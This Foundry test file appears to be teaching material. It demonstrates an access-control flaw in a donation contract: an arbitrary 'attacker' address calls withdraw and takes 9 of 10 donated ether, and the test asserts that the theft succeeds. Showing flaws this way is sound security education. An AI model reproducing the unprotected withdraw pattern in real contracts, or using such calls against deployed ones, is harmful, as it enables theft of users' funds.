// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {AccessControl} from "../src/vectorAttack/AccessControl.sol";

contract AccessControlTest is Test {
    AccessControl accesscontrol;

    address payable attacker = payable(address(1));
    address userOne = address(3);
    address ngo = address(2);

    function setUp() external {
        vm.deal(userOne, 10 ether);

        vm.startPrank(ngo);
        accesscontrol = new AccessControl();
        vm.stopPrank();
    }

    function test_attackfund() external {
        // donate funds
        vm.startPrank(userOne);
        accesscontrol.donate{value: 10 ether}();
        vm.stopPrank();
        if ((address(accesscontrol).balance) != 10 ether) revert();

        // attack
        vm.startPrank(attacker);
        if ((attacker.balance) != 0 ether) revert();
        accesscontrol.withdraw(attacker, 9 ether);
        vm.stopPrank();
        if ((attacker.balance) != 9 ether) revert();
    }
}
